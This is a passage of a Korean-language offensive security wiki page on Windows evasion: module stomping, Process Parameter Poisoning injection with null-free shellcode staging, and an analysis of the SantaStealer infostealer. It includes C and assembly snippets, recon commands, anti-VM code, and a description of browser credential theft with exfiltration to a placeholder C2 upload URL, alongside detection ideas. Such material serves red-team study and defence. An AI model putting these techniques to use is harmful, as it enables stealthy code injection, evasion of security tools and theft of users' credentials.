3. 디스크의 후보 DLL을 검색하고 PE section의 **`.text` `Misc_VirtualSize`**를 payload 크기와 비교합니다. 이 값은 **메모리에 매핑될 때** executable section의 크기를 나타내므로 파일 크기보다 중요합니다.
4. **Export Address Table(EAT)**을 파싱하고 export된 함수의 RVA를 stomp 시작 offset으로 선택합니다.
5. **blast radius**를 계산합니다. payload가 선택된 함수의 경계를 넘으면 메모리상 그 뒤에 배치된 인접 export를 덮어쓰게 됩니다.

실제 환경에서 볼 수 있는 일반적인 recon/선택 helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

운영 참고 사항
- `LoadLibrary`/unexpected image loads의 telemetry를 피하려면 원격 프로세스에 **이미 로드된** DLL을 우선 사용합니다.
- 대상 애플리케이션에서 거의 실행되지 않는 export를 우선 사용합니다. 그렇지 않으면 스레드 생성 전후에 일반적인 코드 경로가 stomp된 바이트에 접근할 수 있습니다.
- 대형 implant에서는 injector 소스에서 전체 버퍼가 올바르게 표현되도록 shellcode embedding을 문자열 리터럴에서 **byte-array/braced initializer**로 변경해야 하는 경우가 많습니다.

탐지 아이디어
- 흔히 사용하는 private RWX/RX 할당 대신 **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`)에 원격 쓰기.
- 메모리상의 export entry point 바이트가 디스크의 backing file과 더 이상 일치하지 않는 경우.
- 최근 첫 바이트가 수정된 합법적인 DLL export 내부에서 실행을 시작하는 원격 스레드 또는 context pivot.
- DLL `.text` 페이지를 대상으로 한 의심스러운 `VirtualProtect(Ex)` / `WriteProcessMemory` 시퀀스 이후의 스레드 생성.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3)은 고전적인 원격 쓰기 경로(`VirtualAllocEx` + `WriteProcessMemory`)를 피하는 **process-injection / EDR-evasion** 기법입니다. 이미 실행 중인 대상에 바이트를 복사하는 대신, Windows가 선택된 `CreateProcessW` 시작 매개변수를 자식 프로세스로 **복사**하고 이를 `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) 안에 저장한다는 점을 악용합니다.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW`가 복사하는 Poisonable carriers

유용한 carriers는 다음과 같습니다.

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` 사용 시) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

실제 사용 시 carrier 제약 사항:

- `lpCommandLine`은 `CreateProcessW`가 사용할 수 있도록 **writable memory**를 가리켜야 하며, null terminator를 포함해 **32,767 Unicode characters**로 제한됩니다.
- `lpEnvironment`는 연속된 `NAME=VALUE\0` 문자열로 구성되고 끝에 추가 `\0`이 붙는 Unicode environment block이어야 합니다.
- `lpReserved`는 공식적으로 예약되어 있으므로, `ShellInfo` 매핑은 안정적으로 문서화된 계약이 아니라 구현 세부 사항으로 취급해야 합니다.

이렇게 하면 일반적인 프로세스 생성이 **payload-transfer primitive**로 바뀝니다. 공격자는 제어하는 시작 데이터를 사용해 자식 프로세스를 생성하고, Windows가 프로세스 간 복사를 수행하도록 합니다.

### 원격 쓰기 API 없이 원격 주소를 찾는 흐름

자식 프로세스 생성 후 **read-only** primitives로 복사된 버퍼를 찾습니다.

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` 가져오기
2. 원격 `PEB` 읽기
3. `PEB.ProcessParameters` 따라가기
4. `RTL_USER_PROCESS_PARAMETERS` 읽기
5. 선택한 포인터 사용:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

최소 흐름:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### 복사된 매개변수 버퍼 실행

복사된 매개변수 영역은 보통 실행 권한이 없는 `RW`입니다. 일반적인 P3 체인은 다음과 같습니다.

1. 프로세스를 정상적으로 생성합니다(일시 중단하지 않음).
2. `NtProtectVirtualMemory` / `VirtualProtectEx`로 선택한 매개변수 페이지에 실행 권한을 부여합니다.
3. `PROCESS_INFORMATION`에서 이미 반환된 주 스레드 핸들을 재사용합니다.
4. `NtSetContextThread`(`CONTEXT_CONTROL`, `RIP` 덮어쓰기)로 실행을 리디렉션합니다.

일반적인 thread hijacking 워크플로와 달리, 여기서는 `SuspendThread` / `ResumeThread`가 **필요하지 않습니다**. 반환된 주 스레드 핸들에서 바로 컨텍스트를 변경할 수 있습니다.

이 방식은 주입에 사용되는 것으로 흔히 모니터링되는 여러 API를 피합니다.

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- `SuspendThread` / `ResumeThread`도 흔히 피합니다.

### Null 바이트 제한과 단계별 shellcode

세 가지 전달 매개체 모두 **문자열 또는 문자열과 유사한 데이터**이므로, `0x00`이 포함된 raw payload는 전송 중 잘립니다. 실용적인 우회 방법은 런타임에 상수를 재구성한 다음 임의의 두 번째 단계를 로드하는 **null-free 첫 번째 단계**를 사용하는 것입니다.

간단한 패턴은 XOR 기반 상수 생성입니다.

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

이를 통해 first stage는 전송되는 매개변수에 null byte를 포함하지 않고도 스택 문자열, API 인수, DLL 경로 또는 second-stage shellcode loader를 구성할 수 있습니다.

### first stage의 스택 기반 API 호출

first stage에서 `LoadLibraryA`와 같은 API를 호출해야 하는 경우 다음을 수행할 수 있습니다.

- 대상 스택에 문자열/버퍼를 push합니다
- **32-byte x64 shadow space**를 예약합니다
- `RCX`, `RDX`, `R8`, `R9`에 상수 또는 `RSP` 기준 포인터를 설정합니다
- 호출 전에 `RSP`를 **16-byte 정렬** 상태로 유지합니다

그런 다음 second stage를 스택에서 `PAGE_READWRITE` 할당 영역으로 복사하고, `VirtualProtect`로 `PAGE_EXECUTE_READ`로 변경한 뒤 실행할 수 있습니다. 이렇게 하면 직접적인 RWX 할당을 피할 수 있습니다.

### 탐지 아이디어

저자들이 언급한 유용한 헌팅 기회:

- `VirtualProtectEx` / `NtProtectVirtualMemory`를 사용해 **process-parameter 페이지를 실행 가능하게 변경**
- 해당 보호 속성 변경 후 이어지는 `SetThreadContext` / `NtSetContextThread`
- `PEB`를 원격으로 읽은 뒤 `RTL_USER_PROCESS_PARAMETERS`를 읽는 행위
- 프로세스 생성 중 비정상적으로 길거나 엔트로피가 높은 `lpCommandLine`, `lpEnvironment` 또는 `STARTUPINFO.lpReserved` 값

### 참고 사항

- P3는 **프로세스 간 전송 기법**이며, 그 자체로 완전한 실행 프리미티브는 아닙니다. 복사된 매개변수에는 여전히 실행 권한 변경과 실행 리디렉션 방법이 필요합니다.
- 저자들은 `RtlCreateProcessReflection` / Dirty Vanity도 고려했지만, 내부적으로 `NtWriteVirtualMemory` 및 `NtCreateThreadEx`와 같은 의심스러운 프리미티브를 사용하기 때문에 제외했습니다.

## 파일리스 회피 및 자격 증명 탈취를 위한 SantaStealer Tradecraft

SantaStealer(일명 BluelineStealer)는 최신 정보 탈취 악성코드가 AV 우회, anti-analysis 및 자격 증명 접근을 단일 워크플로에서 어떻게 결합하는지 보여줍니다.<sup>[[24]](#references)</sup>

### 키보드 레이아웃 검사 및 샌드박스 지연

- 설정 플래그(`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 키보드 레이아웃을 열거합니다. 키릴 문자 레이아웃이 발견되면 샘플은 빈 `CIS` 마커를 생성하고 stealers를 실행하기 전에 종료됩니다. 이를 통해 제외 대상 로캘에서 실행되는 것을 방지하는 동시에 헌팅 아티팩트를 남깁니다.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 계층형 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하며 각 이름에 사용자 지정 rolling checksum을 적용한 뒤, 디버거/샌드박스용 내장 blocklist와 비교합니다. 컴퓨터 이름에도 checksum을 적용하고 `C:\analysis` 같은 작업 디렉터리도 검사합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 부팅 시간)을 확인하고, VirtualBox additions를 탐지하기 위해 `OpenServiceA("VBoxGuest")`를 호출하며, sleep 전후의 타이밍을 검사해 single-stepping을 찾아냅니다. 하나라도 탐지되면 모듈이 실행되기 전에 중단합니다.

### Fileless helper와 이중 ChaCha20 reflective loading

- 기본 DLL/EXE에는 Chromium credential helper가 포함되어 있으며, 이를 디스크에 드롭하거나 메모리에 수동으로 매핑합니다. fileless 모드에서는 helper 관련 파일을 남기지 않도록 import와 relocation을 직접 처리합니다.
- 해당 helper는 두 번 ChaCha20으로 암호화된 2차 DLL을 저장합니다(32바이트 키 2개 + 12바이트 nonce 2개). 두 번의 복호화가 끝나면 blob을 reflective loading하고(`LoadLibrary` 사용 안 함), [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 가져온 export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`를 호출합니다.<sup>[[25]](#references)</sup>
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 실행 중인 Chromium 브라우저에 주입하고 AppBound Encryption 키를 상속합니다. 그런 다음 ABE hardening에도 불구하고 SQLite 데이터베이스에서 비밀번호/쿠키/신용카드를 직접 복호화합니다.

### 모듈형 메모리 내 수집 및 청크 단위 HTTP 유출

- `create_memory_based_log`는 전역 `memory_generators` 함수 포인터 테이블을 순회하며, 활성화된 모듈(Telegram, Discord, Steam, 스크린샷, 문서, 브라우저 확장 프로그램 등)마다 스레드 하나를 생성합니다. 각 스레드는 결과를 공유 버퍼에 기록하고 약 45초의 join 대기 시간 후 파일 개수를 보고합니다.
- 작업이 끝나면 정적으로 링크된 `miniz` 라이브러리를 사용해 모든 항목을 `%TEMP%\\Log.zip`으로 압축합니다. 그런 다음 `ThreadPayload1`은 15초간 sleep한 뒤 HTTP POST를 통해 아카이브를 10 MB 청크로 나누어 `http://<C2>:6767/upload`에 전송하면서 브라우저의 `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 위장합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적으로 `w: <campaign_tag>`가 포함되며, 마지막 청크에는 `complete: true`가 추가되어 C2에 재조립이 완료되었음을 알립니다.

## References

- [1] [고급 회피 기법: 정밀한 Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – 블로그](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – 콜 스택: 이제 멀웨어가 쉽게 빠져나갈 수 없습니다](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – 문서](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – 예제](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – 예제](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – 콜 스택 스푸핑 PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer의 새로운 감염 체인 및 ConfuserEx 기반 난독화](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 제로 트러스트를 신뢰해야 할까요? Zscaler posture check 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 이전: Storm-2603의 과거 랜섬웨어 활동 살펴보기](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: 전달된 Export 악용](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports 인벤토리 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – 동적 링크 라이브러리 검색 순서](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – 프로세스 보안 및 액세스 권한](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU 참조 (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL 실행기](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL)을 활용해 EDR에 대응하기](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – 폴더 리디렉션 기법으로 Windows Defender의 보호막 깨기](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink 명령 참조](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 순수한 장막 아래: RAT에서 Builder, 그리고 개발자까지](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer가 찾아옵니다: 새롭고 야심 찬 정보 탈취 멀웨어](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption 복호화](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API tracing으로 Node.js 멀웨어에 대응하기](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [잠자는 숲속의 미녀: Crystal Palace로 Adaptix 재우기](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [잠자는 숲속의 미녀 II: CFG, CET 및 Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep 난독화](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW 숨기기](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team 작전에서 Chrome Remote Desktop 악용: 실용 가이드](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender의 Remediation Driver를 커널 작업 프리미티브로 무기화하기](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo 동반 코드](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM으로 자체 마스킹 함수 만들기](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
